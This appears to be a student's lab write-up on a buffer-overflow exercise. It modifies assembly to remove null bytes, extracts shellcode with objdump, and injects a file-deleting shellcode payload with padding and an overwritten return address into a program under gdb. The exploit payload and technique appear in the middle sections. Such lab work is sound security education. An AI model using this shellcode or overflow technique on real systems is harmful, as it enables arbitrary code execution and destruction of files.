# LAB2

**Student ID:** 22110038
**Name:** Phan Triệu Huy 

## Delete File dummyfile:
create file dummy and setup:

![image](https://github.com/user-attachments/assets/a258dbbe-9919-4b30-8b27-a4408987cfbb)

**change file_del.asm**:

Because eax is 32 bits register so when we move a small value into eax, the high bits of this register (24 bits) will automatically be filled with 0.

We need to edit a few lines of code in file_del.asm:

  Use al register. Because this is the lowest 8-bit part of the eax register. When you move a value into al, only 8-bits (1 byte) are changed, not affecting the rest of eax.

  Clear the eax register using command:

xor eax, eax

  Replace move eax, 10 with:

mov al, 8

add al, 2

![image](https://github.com/user-attachments/assets/1404b019-75f9-4914-867d-a3c51679ba3d)

**generate shellcode**:
  for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
![image](https://github.com/user-attachments/assets/75c66888-246a-47ca-8d74-1039ed389a0b)
**Run gdb:**
set breakpoint at    0x0804846b <+48>:    mov    eax,0x0
![image](https://github.com/user-attachments/assets/0d074529-21c3-4258-bab4-ec8d37ab9793)

run code (it's still x00 at the end, so i will change it):
  r $(python -c "print('\xeb\x13\x31\xc0\xb0\x08\x04\x02\xbb\x7a\x80\x04\x08\xcd\x80\x89\xc0\x34\x01\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x01' + 'a'*32 + '\xff\xff\xff\xff')")
after run:
  ![image](https://github.com/user-attachments/assets/1a2cb6fe-7008-434d-ac18-673b80c49fe4)
change return address and 0xffffd6cb = 0x00:
![image](https://github.com/user-attachments/assets/74098831-1904-460e-8d92-01ef41caba9d)
and after continue, the result:

![image](https://github.com/user-attachments/assets/fbd2fd9b-5c39-450c-8b69-511415f067fe)















